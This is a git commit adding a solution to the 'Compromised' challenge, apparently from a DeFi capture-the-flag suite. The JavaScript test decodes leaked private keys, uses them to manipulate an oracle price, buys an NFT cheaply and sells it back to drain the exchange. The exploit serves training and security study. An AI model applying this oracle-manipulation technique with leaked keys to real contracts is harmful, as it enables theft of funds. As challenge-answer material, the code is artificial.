5149f5039983c6b0fe10fd1a493d62e0a6705634
Avichal <pandeyavichal7@gmail.com>
2022-05-12 21:28:58 +0530

    Add solution for Compromised challenge

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -60,7 +60,58 @@ describe('Compromised challenge', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+        /** CODE YOUR EXPLOIT HERE */        
+        let key1 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
+        let key2 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";
+                        
+        // hex -> ascii
+        // base64 -> hex
+        key1 = Buffer.from(
+            Buffer.from(key1.replaceAll(" ", ""), "hex").toString(),
+             "base64"
+        ).toString();
+
+        // hex -> ascii
+        // base64 -> hex
+        key2 = Buffer.from(
+            Buffer.from(key2.replaceAll(" ", ""), "hex").toString(),
+             "base64"
+        ).toString();
+                
+        const wallet1 = new ethers.Wallet(key1, ethers.provider);
+        const wallet2 = new ethers.Wallet(key2, ethers.provider);
+        console.log(wallet1.address);
+        console.log(wallet2.address);
+
+        const NFT = await this.nftToken.symbol();
+        let price = await this.oracle.getMedianPrice(NFT);
+        console.log(`current price ${price}`);
+
+        await this.oracle.connect(wallet1).postPrice(NFT, ethers.BigNumber.from("1"));
+        await this.oracle.connect(wallet2).postPrice(NFT, ethers.BigNumber.from("1"));
+
+        price = await this.oracle.getMedianPrice(NFT);
+        console.log(`current price ${price}`);
+
+        let tx = await this.exchange.connect(attacker).buyOne(
+            {value: ethers.BigNumber.from('1')}
+        );
+
+        await tx.wait(1);
+                
+        await this.oracle.connect(wallet1).postPrice(NFT, ethers.BigNumber.from(EXCHANGE_INITIAL_ETH_BALANCE.add(1)));
+        await this.oracle.connect(wallet2).postPrice(NFT, ethers.BigNumber.from(EXCHANGE_INITIAL_ETH_BALANCE.add(1)));
+ 
+        price = await this.oracle.getMedianPrice(NFT);
+        console.log(`current price ${price}`);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+
+        tx = await this.exchange.connect(attacker).sellOne(0);
+        await tx.wait(1);
+                    
+        await this.oracle.connect(wallet1).postPrice(NFT, ethers.BigNumber.from(INITIAL_NFT_PRICE));
+        await this.oracle.connect(wallet2).postPrice(NFT, ethers.BigNumber.from(INITIAL_NFT_PRICE));
     });
 
     after(async function () {
@@ -80,7 +131,7 @@ describe('Compromised challenge', function () {
         expect(
             await this.nftToken.balanceOf(attacker.address)
         ).to.be.eq('0');
-
+        
         // NFT price shouldn't have changed
         expect(
             await this.oracle.getMedianPrice("DVNFT")
